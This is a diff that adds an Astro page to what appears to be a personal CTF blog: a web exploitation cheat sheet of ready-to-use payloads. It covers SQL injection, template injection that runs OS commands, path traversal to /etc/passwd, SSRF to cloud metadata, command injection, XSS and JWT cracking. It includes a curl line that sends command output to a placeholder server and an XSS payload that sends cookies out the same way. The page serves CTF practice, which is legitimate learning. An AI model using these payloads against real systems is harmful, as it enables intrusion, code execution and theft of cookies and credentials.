@@ -1,0 +1,154 @@
+---
+import BaseHead from '../../components/BaseHead.astro';
+import Footer from '../../components/Footer.astro';
+import Header from '../../components/Header.astro';
+import { SITE_TITLE } from '../../consts';
+
+const codeSQLi = [
+	"' OR 1=1--",
+	"' OR '1'='1",
+	"admin'--",
+	"' UNION SELECT null,null,null--",
+	"' UNION SELECT table_name,null FROM information_schema.tables--",
+	"",
+	"# Boolean blind",
+	"' AND 1=1--   (true)",
+	"' AND 1=2--   (false)",
+	"",
+	"# Time blind",
+	"' AND SLEEP(5)--",
+	"'; WAITFOR DELAY '0:0:5'--    (MSSQL)",
+].join("\n");
+
+const codeSSTI = [
+	"# Detection: {{7*7}}  ${7*7}  #{7*7}",
+	"",
+	"# Jinja2 (Python)",
+	"{{config}}",
+	"{{cycler.__init__.__globals__.os.popen('id').read()}}",
+	"",
+	"# Twig (PHP)",
+	"{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+].join("\n");
+
+const codeLFI = [
+	"../../../etc/passwd",
+	"....//....//....//etc/passwd",
+	"php://filter/convert.base64-encode/resource=index.php",
+	"php://input",
+	"",
+	"# Useful files",
+	"/etc/passwd",
+	"/proc/self/environ",
+	"/var/log/apache2/access.log   (log poisoning)",
+].join("\n");
+
+const codeSSRF = [
+	"http://127.0.0.1/admin",
+	"http://localhost:8080",
+	"http://[::1]/",
+	"",
+	"# Cloud metadata",
+	"http://169.254.169.254/latest/meta-data/    (AWS)",
+	"http://metadata.google.internal/            (GCP)",
+	"",
+	"# Bypass",
+	"http://127.0.0.1.nip.io",
+	"http://0x7f000001",
+	"http://2130706433",
+].join("\n");
+
+const codeCMDi = [
+	"; id",
+	"&& id",
+	"| id",
+	"$(id)",
+	"",
+	"# Bypass spaces",
+	"cat$IFS/etc/passwd",
+	"",
+	"# Blind OOB",
+	"; curl http://YOUR.SERVER/$(id|base64)",
+].join("\n");
+
+const codeXSS = [
+	"<script>alert(1)<" + "/script>",
+	"<img src=x onerror=alert(1)>",
+	"<svg onload=alert(1)>",
+	"",
+	"# Cookie steal",
+	"<script>fetch('https://YOUR.SERVER/?c='+document.cookie)<" + "/script>",
+].join("\n");
+
+const codeJWT = [
+	"# Decode",
+	'echo "PAYLOAD" | base64 -d',
+	"",
+	"# Attacks: alg:none, RS256->HS256, weak secret",
+	"hashcat -a 0 -m 16500 token.jwt wordlist.txt",
+].join("\n");
+
+const tools = ['Burp Suite','sqlmap','ffuf','gobuster','nikto','wfuzz','curl','jwt.io','CyberChef','Postman','dirsearch'];
+---
+
+<!doctype html>
+<html lang="en">
+	<head>
+		<BaseHead title={`Web Cheat Sheet | ${SITE_TITLE}`} description="CTF web exploitation quick reference." />
+	</head>
+	<body>
+		<Header />
+		<main>
+			<div class="breadcrumb"><a href="/posts">Posts</a> / Cheat Sheets / Web</div>
+			<h1>Web Cheat Sheet</h1>
+
+			<section>
+				<h2>SQL Injection</h2>
+				<pre><code set:text={codeSQLi} /></pre>
+			</section>
+			<section>
+				<h2>SSTI (Server-Side Template Injection)</h2>
+				<pre><code set:text={codeSSTI} /></pre>
+			</section>
+			<section>
+				<h2>LFI / Path Traversal</h2>
+				<pre><code set:text={codeLFI} /></pre>
+			</section>
+			<section>
+				<h2>SSRF</h2>
+				<pre><code set:text={codeSSRF} /></pre>
+			</section>
+			<section>
+				<h2>Command Injection</h2>
+				<pre><code set:text={codeCMDi} /></pre>
+			</section>
+			<section>
+				<h2>XSS</h2>
+				<pre><code set:text={codeXSS} /></pre>
+			</section>
+			<section>
+				<h2>JWT</h2>
+				<pre><code set:text={codeJWT} /></pre>
+			</section>
+			<section>
+				<h2>Tools</h2>
+				<div class="tools">
+					{tools.map((t) => <span>{t}</span>)}
+				</div>
+			</section>
+		</main>
+		<Footer />
+	</body>
+</html>
+
+<style>
+	.breadcrumb { font-size: 0.8em; color: var(--text-muted); margin-bottom: 1.5em; }
+	.breadcrumb a { color: var(--accent); }
+	h1 { font-size: 1.5em; margin-bottom: 1.25em; }
+	h2 { font-size: 0.95em; font-weight: 600; margin: 1.75em 0 0.6em; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.06em; }
+	section { margin-bottom: 0.5em; }
+	pre { background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 6px; padding: 1em 1.2em; overflow-x: auto; font-size: 0.82em; line-height: 1.6; }
+	code { font-family: 'Fira Code', 'Consolas', monospace; }
+	.tools { display: flex; flex-wrap: wrap; gap: 0.4em; margin-top: 0.4em; }
+	.tools span { font-size: 0.78em; padding: 3px 10px; border-radius: 12px; background: var(--bg-secondary); border: 1px solid var(--border); color: var(--text-muted); }
+</style>
